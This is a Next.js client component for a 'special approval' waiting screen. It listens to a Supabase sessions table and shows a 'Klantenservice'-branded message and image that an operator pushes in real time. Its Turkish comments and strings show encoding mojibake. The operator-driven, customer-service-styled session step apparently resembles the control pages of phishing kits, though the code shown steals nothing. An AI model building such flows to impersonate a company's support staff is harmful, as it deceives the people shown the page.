"use client";

import { useEffect, useState, useRef } from "react";
import Image from "next/image";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

import { Linkify } from "@/components/ui/Linkify";

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const supabase = createBrowserSupabaseClient();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [message, setMessage] = useState("LÃ¼tfen bekleyiniz...");
  const [imageUrl, setImageUrl] = useState<string | null>(null);
  const [lang, setLang] = useState<"de" | "tr">("de");
  const [ready, setReady] = useState(false);
  
  // KRÄ°TÄ°K: Bu ref true olduÄŸunda sayfa bir daha asla render olmaz ve yÃ¶nlendirmeyi bozamaz.
  const isRedirecting = useRef(false);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached) setEffectiveSessionId(cached);
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId || isRedirecting.current) return;
    if (!supabase) return;

    const syncStatus = async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      
      if (!data || isRedirecting.current) return;

      const fd = (data.form_data ?? {}) as Record<string, any>;
      setMessage(fd.specialNoticeText ?? fd.customMessage ?? "LÃ¼tfen bekleyiniz...");
      setImageUrl(fd.specialNoticeImage ?? fd.customImage ?? null);
      setLang((fd.specialNoticeLang as "de" | "tr") ?? "de");
      setReady(true);
    };

    void syncStatus();

    const channel = supabase.channel(`special-approval-content:${effectiveSessionId}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
      (payload) => {
        const next = payload.new as { form_data?: Record<string, any> | null; current_step?: string };
        if (next.current_step && next.current_step !== "special_approval") return;

        const fd = (next.form_data ?? {}) as Record<string, any>;
        setMessage(fd.specialNoticeText ?? fd.customMessage ?? "LÃ¼tfen bekleyiniz...");
        setImageUrl(fd.specialNoticeImage ?? fd.customImage ?? null);
        setLang((fd.specialNoticeLang as "de" | "tr") ?? "de");
        setReady(true);
      })
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  // YÃ¶nlendirme baÅŸladÄ±ÄŸÄ± an ekrana hiÃ§bir ÅŸey basma, render'Ä± Ã¶ldÃ¼r.
  if (isRedirecting.current) return null;

  if (!ready) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in text-center">
        <div className="mb-4">
          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Klantenservice</p>
        </div>
        
        <p className="whitespace-pre-wrap text-lg font-bold text-white leading-tight mb-6">
          <Linkify text={message} />
        </p>

        {imageUrl && (
          <div className="mt-4 rounded-2xl overflow-hidden border border-white/10 shadow-sm bg-white/5 p-1">
            <Image 
              src={imageUrl} 
              alt="Support" 
              width={1200} 
              height={800} 
              className="h-auto w-full rounded-xl object-contain mx-auto" 
              priority 
            />
          </div>
        )}
      </div>
    </div>
  );
}
